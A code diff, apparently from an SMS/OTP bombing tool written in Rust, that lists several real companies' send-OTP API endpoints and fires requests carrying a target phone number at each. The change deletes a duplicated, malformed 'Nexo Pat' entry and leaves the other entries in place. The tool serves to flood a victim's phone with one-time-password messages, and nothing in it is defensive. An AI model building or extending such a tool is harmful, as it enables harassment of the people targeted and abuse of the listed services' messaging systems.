@@ -137,10 +137,6 @@ fire("Apex4u",
     json!({"phoneNumber": &number})
 ),
         
-fire("Nexo Pat")
-    "https://host03pet.nexopet.com/api/v1.0/users/send-otp"
-    json!({"phone": &number,})     
-), 
         
 fire("AWS POC",
     "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
@@ -221,11 +217,7 @@ fire("My Guradian BD"
   "mobileNumber": &number,
   "type": null
 })
-), 
-fire("Nexo Pat")
-    "https://host03pet.nexopet.com/api/v1.0/users/send-otp"
-    json!({"phone": &number,})     
-), 
+),
 
 fire("Gorilla Move", "https://api.gorillamove.com/api/v1/core/account/phone_login", json!({"phone_number": &number, "step": 1})),
 fire("Munchies BD", "https://api.munchies.com.bd/parse/functions/generateOtp", json!({"phone": &number})),
